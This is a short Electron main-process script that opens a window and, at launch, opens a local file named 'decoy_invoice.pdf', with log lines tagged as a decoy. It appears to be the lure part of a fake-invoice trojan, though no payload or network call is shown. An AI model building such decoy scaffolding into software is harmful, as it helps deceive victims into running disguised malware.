const { app, BrowserWindow, shell } = require('electron');
const path = require('path');
const fs = require('fs');

const createWindow = () => {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js')
    }
  })

  win.loadFile('index.html')
}

const openDecoyPDF = () => {
  const pdfAssetPath = 'assets/invoice.pdf';

  // Check if the file actually exists before trying to open it
   if (fs.existsSync('decoy_invoice.pdf')) {
    shell.openPath('decoy_invoice.pdf')
      .then((err) => {
        if (err) {
          console.error('[decoy] Could not open decoy_invoice.pdf:', err);
        } else {
          console.log('[decoy] Decoy invoice opened successfully.');
        }
      });
  } else {
    console.error('[decoy] decoy_invoice.pdf not found');
  }
}

app.whenReady().then(() => {
  createWindow();
  openDecoyPDF();
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});